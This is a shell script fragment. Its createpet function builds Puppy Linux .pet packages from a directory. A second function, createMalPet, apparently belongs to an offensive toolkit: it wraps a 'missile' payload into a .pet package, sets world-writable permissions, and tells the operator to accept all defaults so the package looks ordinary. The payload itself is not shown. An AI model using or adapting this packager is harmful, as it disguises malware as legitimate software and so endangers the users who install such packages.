
# Packager for pet packages
createpet(){
    PACKAGE_NAME=$(basename "${1}")
    test ! -d "${PACKAGE_NAME}" \
	&& echo "${PACKAGE_NAME} not found in current directory." \
		"Move to the directory where ${PACKAGE_NAME} present" \
		"and run this command." \
		"exitting.." && exit 1

    echo -n "Application Name[Default: ${PACKAGE_NAME%%-[0-9]\.*}] " \
	&& read APPLICATION_NAME \
	&& test -z "${APPLICATION_NAME}" && APPLICATION_NAME="${PACKAGE_NAME%%-[0-9]\.*}"

    echo -n "Comment[Default: ${PACKAGE_NAME} pet package] " \
	&& read COMMENT \
	&& test -z "${COMMENT}" && COMMENT="${PACKAGE_NAME} pet package"

    echo -n "Dependency packages[seperated by ','] " && read DEPENDENCIES

    echo -n "Registered(yes/no)[Default: yes] " && read REGISTER \
	&& test -z "${REGISTER}" && REGISTER="yes"

    if test ! -z "${XDGMENU}"
    then

	echo
	echo "[Creating /usr/share/applications/${APPLICATION_NAME}.desktop]"
	echo

	test ! -d "${PACKAGE_NAME}/usr/share/applications" \
	    && mkdir -p "${PACKAGE_NAME}/usr/share/applications"

	echo -n "Path to locate Icon file[Default: /usr/lical/lib/X11/mini-icons/x16.xpm] " \
	    && read ICON_PATH \
	    && test -z "${ICON_PATH}" && ICON_PATH="/usr/local/lib/X11/mini-icons/x16.xpm"

	echo -n "Commandline to Execute[Default: rxvt -e ${APPLICATION_NAME} --help] " \
	    && read COMMANDLINE \
	    && test -z "${COMMANDLINE}" && COMMANDLINE="rxvt -e ${APPLICATION_NAME} --help"

	echo -n "Menu Category:
	$(grep Categories /usr/share/applications/* | cut -d':' -f2 | cut -d'=' -f2 | tr '\n' ',')
	[Default: Utility] " \
	    && read CATEGORY \
	    && test -z "${CATEGORY}" && CATEGORY="Utility"

	# Name and entries are taken from the .desktop files present in
	# /usr/share/applications/

	XDG_DESKTOP_FILE_CONTENT="[Desktop Entry]
	Encoding=UTF-8
	Name=${APPLICATION_NAME}
	Icon=${ICON_PATH}
	Comment=${COMMENT}
	Exec=${COMMANDLINE}
	Terminal=false
	Type=Application
	Categories=${CATEGORY}
	GenericName=${APPLICATION_NAME}"

	echo "${XDG_DESKTOP_FILE_CONTENT}" \
	    | tee "${PACKAGE_NAME}/usr/share/applications/${APPLICATION_NAME}.desktop"

    fi

    echo
    echo "[Creating ${PACKAGE_NAME}.files file]"

    find "${PACKAGE_NAME}" \
	| sed -e"s%^${PACKAGE_NAME}%%g" \
	| tee "${PACKAGE_NAME}.files"
    mv -f "${PACKAGE_NAME}.files" "${PACKAGE_NAME}"

    echo
    echo "[Creating ${PACKAGE_NAME}.pet.specs file]"
    echo

    PET_SPECS="PUPAPPLICATION='${APPLICATION_NAME}'
PETMENUDESCR='${COMMENT}'
PETOFFICIALDEPS='${DEPENDENCIES}'
PETREGISTER='${REGISTER}'"
    echo "${PET_SPECS}" | tee "${PACKAGE_NAME}/${PACKAGE_NAME}.pet.specs"

    echo
    echo "[Creating ${PACKAGE_NAME}.tar file]"
    echo

    tar cvf "${PACKAGE_NAME}.tar" "${PACKAGE_NAME}"

    echo
    echo "[Creating ${PACKAGE_NAME}.tar.gz file]"
    echo

    # This is how dir2pet doing, I slightly modified.

    echo "gzipping..." && gzip "${PACKAGE_NAME}.tar"
    echo "md5summing..." && md5sum "${PACKAGE_NAME}.tar.gz" | cut -d ' ' -f 1 >> "${PACKAGE_NAME}.tar.gz"
    echo "renaming..." && mv -f "${PACKAGE_NAME}.tar.gz" "${PACKAGE_NAME}.pet"
    echo "${PACKAGE_NAME}.pet Created..."


}

createMalPet() {
    while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" "${pPackage}" ; \
	  read $opt -e inmissile
    do
	case $inmissile in
	    y|Y)
		dirfile="${0##*/}$SPID"
		mkdir "${dirfile}"
		cd "$_"
		chmod -R 777 "../${dirfile}"
		! [ -x "../misc" -a -r "../misc" -a -w "../misc" ] && \
		    chmod -R 777 "../misc"
		chk_file
		cd -
		mv "${dirfile}" "${CUT_IT}"
		echo "${open}${bold}${green}HIT ENTER AT ALL FIELDS${close}"
		sleep 2
		createpet "${CUT_IT}"
		rm -rf "${CUT_IT}"
		chmod 777 "${CUT_IT}.pet"
		box3d
		;;
	    n|N)
		shit_func
		;;
	    *)
		echo "${open}${bold}${red}Invalid response ${close}"
		continue ;;
	esac
    done
}
